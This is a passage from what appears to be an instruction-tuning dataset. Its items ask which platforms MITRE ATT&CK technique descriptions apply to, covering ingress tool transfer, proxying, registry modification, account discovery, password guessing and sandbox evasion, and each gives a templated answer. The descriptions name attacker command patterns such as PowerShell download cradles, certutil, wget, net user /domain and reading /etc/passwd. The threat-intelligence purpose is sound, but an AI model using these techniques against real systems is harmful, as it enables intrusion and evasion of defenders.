      "answer": "The provided description is related to MITRE technique Indicator Removal: File Deletion (T1070.004);\nTechnique Indicator Removal: File Deletion (T1070.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Ingress Tool Transfer (T1105);\nTechnique Ingress Tool Transfer (T1105) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
      "answer": "The provided description is related to MITRE technique Ingress Tool Transfer (T1105);\nTechnique Ingress Tool Transfer (T1105) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.\n\nAdversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Proxy (T1090);\nTechnique Proxy (T1090) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.\n\nAdversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.",
      "answer": "The provided description is related to MITRE technique Proxy (T1090);\nTechnique Proxy (T1090) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.\n\nAdversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence. Although often used as payloads in an infection chain (e.g. Spearphishing Attachment), adversaries may also create a new shortcut as a means of indirection, while also abusing Masquerading to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.\n\nShortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. Browser Extensions) to persistently launch malware.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Boot or Logon Autostart Execution: Shortcut Modification (T1547.009);\nTechnique Boot or Logon Autostart Execution: Shortcut Modification (T1547.009) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.\n\nAdversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence. Although often used as payloads in an infection chain (e.g. Spearphishing Attachment), adversaries may also create a new shortcut as a means of indirection, while also abusing Masquerading to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.\n\nShortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. Browser Extensions) to persistently launch malware.",
      "answer": "The provided description is related to MITRE technique Boot or Logon Autostart Execution: Shortcut Modification (T1547.009);\nTechnique Boot or Logon Autostart Execution: Shortcut Modification (T1547.009) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Modify Registry (T1112);\nTechnique Modify Registry (T1112) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.",
      "answer": "The provided description is related to MITRE technique Modify Registry (T1112);\nTechnique Modify Registry (T1112) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.",
    "context": "",
    "output": "The provided description is related to MITRE technique Audio Capture (T1123);\nTechnique Audio Capture (T1123) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.",
      "answer": "The provided description is related to MITRE technique Audio Capture (T1123);\nTechnique Audio Capture (T1123) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.\n\nCommands such as <code>net user</code> and <code>net localgroup</code> of the Net utility and <code>id</code> and <code>groups</code> on macOS and Linux can list local users and groups. On Linux, local users can also be enumerated through the use of the <code>/etc/passwd</code> file. On macOS the <code>dscl . list /Users</code> command can be used to enumerate local accounts.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Account Discovery: Local Account (T1087.001);\nTechnique Account Discovery: Local Account (T1087.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.\n\nCommands such as <code>net user</code> and <code>net localgroup</code> of the Net utility and <code>id</code> and <code>groups</code> on macOS and Linux can list local users and groups. On Linux, local users can also be enumerated through the use of the <code>/etc/passwd</code> file. On macOS the <code>dscl . list /Users</code> command can be used to enumerate local accounts.",
      "answer": "The provided description is related to MITRE technique Account Discovery: Local Account (T1087.001);\nTechnique Account Discovery: Local Account (T1087.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior such as targeting specific accounts which possess particular privileges.\n\nCommands such as <code>net user /domain</code> and <code>net group /domain</code> of the Net utility, <code>dscacheutil -q group</code>on macOS, and <code>ldapsearch</code> on Linux can list domain users and groups. PowerShell cmdlets including <code>Get-ADUser</code> and <code>Get-ADGroupMember</code> may enumerate members of Active Directory groups.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Account Discovery: Domain Account (T1087.002);\nTechnique Account Discovery: Domain Account (T1087.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior such as targeting specific accounts which possess particular privileges.\n\nCommands such as <code>net user /domain</code> and <code>net group /domain</code> of the Net utility, <code>dscacheutil -q group</code>on macOS, and <code>ldapsearch</code> on Linux can list domain users and groups. PowerShell cmdlets including <code>Get-ADUser</code> and <code>Get-ADGroupMember</code> may enumerate members of Active Directory groups.",
      "answer": "The provided description is related to MITRE technique Account Discovery: Domain Account (T1087.002);\nTechnique Account Discovery: Domain Account (T1087.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Owner/User Discovery (T1033);\nTechnique System Owner/User Discovery (T1033) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.",
      "answer": "The provided description is related to MITRE technique System Owner/User Discovery (T1033);\nTechnique System Owner/User Discovery (T1033) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload.\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.",
    "context": "",
    "output": "The provided description is related to MITRE technique Deobfuscate/Decode Files or Information (T1140);\nTechnique Deobfuscate/Decode Files or Information (T1140) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload.\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.",
      "answer": "The provided description is related to MITRE technique Deobfuscate/Decode Files or Information (T1140);\nTechnique Deobfuscate/Decode Files or Information (T1140) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. \n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.. Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Brute Force: Password Guessing (T1110.001);\nTechnique Brute Force: Password Guessing (T1110.001) is applicable to platforms: Containers,  Google Workspace,  IaaS,  Linux,  Network,  Office 365,  SaaS,  Windows,  macOS, Azure AD;\nTherefore, the given procedure description is related to platforms: Containers,  Google Workspace,  IaaS,  Linux,  Network,  Office 365,  SaaS,  Windows,  macOS, Azure AD.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. \n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.. Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
      "answer": "The provided description is related to MITRE technique Brute Force: Password Guessing (T1110.001);\nTechnique Brute Force: Password Guessing (T1110.001) is applicable to platforms: Containers,  Google Workspace,  IaaS,  Linux,  Network,  Office 365,  SaaS,  Windows,  macOS, Azure AD;\nTherefore, the given procedure description is related to platforms: Containers,  Google Workspace,  IaaS,  Linux,  Network,  Office 365,  SaaS,  Windows,  macOS, Azure AD.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.",
    "context": "",
    "output": "The provided description is related to MITRE technique Indicator Removal: File Deletion (T1070.004);\nTechnique Indicator Removal: File Deletion (T1070.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.",
      "answer": "The provided description is related to MITRE technique Indicator Removal: File Deletion (T1070.004);\nTechnique Indicator Removal: File Deletion (T1070.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via Network Device CLI (e.g. <code>reload</code>).\n\nShutting down or rebooting systems may disrupt access to computer resources for legitimate users while also impeding incident response/recovery.\n\nAdversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as Disk Structure Wipe or Inhibit System Recovery, to hasten the intended effects on system availability.?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Shutdown/Reboot (T1529);\nTechnique System Shutdown/Reboot (T1529) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via Network Device CLI (e.g. <code>reload</code>).\n\nShutting down or rebooting systems may disrupt access to computer resources for legitimate users while also impeding incident response/recovery.\n\nAdversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as Disk Structure Wipe or Inhibit System Recovery, to hasten the intended effects on system availability.",
      "answer": "The provided description is related to MITRE technique System Shutdown/Reboot (T1529);\nTechnique System Shutdown/Reboot (T1529) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\n\nSpecific checks will vary based on the target and/or adversary, but may involve behaviors such as Windows Management Instrumentation, PowerShell, System Information Discovery, and Query Registry to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. \n\nChecks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. Once executed, malware may also use File and Directory Discovery to check if it was saved in a folder or file with unexpected or even analysis-related naming artifacts such as `malware`, `sample`, or `hash`.\n\nOther common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions. In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. \n \nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Virtualization/Sandbox Evasion: System Checks (T1497.001);\nTechnique Virtualization/Sandbox Evasion: System Checks (T1497.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\n\nSpecific checks will vary based on the target and/or adversary, but may involve behaviors such as Windows Management Instrumentation, PowerShell, System Information Discovery, and Query Registry to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. \n\nChecks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. Once executed, malware may also use File and Directory Discovery to check if it was saved in a folder or file with unexpected or even analysis-related naming artifacts such as `malware`, `sample`, or `hash`.\n\nOther common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions. In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. \n \nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.",
      "answer": "The provided description is related to MITRE technique Virtualization/Sandbox Evasion: System Checks (T1497.001);\nTechnique Virtualization/Sandbox Evasion: System Checks (T1497.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
